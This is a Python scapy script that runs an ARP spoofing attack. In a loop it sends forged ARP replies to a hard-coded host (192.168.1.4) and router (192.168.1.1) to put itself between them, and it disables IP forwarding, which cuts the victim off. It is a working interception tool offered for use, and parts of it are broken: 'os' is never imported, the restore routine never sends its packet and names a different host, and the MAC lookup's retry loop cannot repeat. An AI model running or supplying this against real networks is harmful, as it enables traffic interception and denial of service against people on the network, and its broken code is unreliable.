from scapy.all import srp,send,ARP
import scapy.all as scapy
import time

def get_mac(ip):
    mac = "xx"
    while mac == "xx":
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1 , verbose=False)[0]
            mac = answered_list[0][1].hwsrc
            # print(mac)
        except:
            pass
        finally:
            return mac

def restore(destination_ip,source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    print(packet.show())
    print(packet.summary())


def spoof(target_ip,spoof_ip):    
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet,verbose=False)

def start():
    count = 0 
    while True:
        spoof("192.168.1.4","192.168.1.1")
        spoof("192.168.1.1","192.168.1.4")
        print("Packet Counts : ",count)
        count = count + 1
        time.sleep(2)
def stop():
    restore("192.168.1.6","192.168.1.1")#restore(target ip , router ip )

    
os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
print("1.start \n 2. restore")
n = int(input("enter ur value : "))
if n == 1 : 
    start()
else : 
    stop()
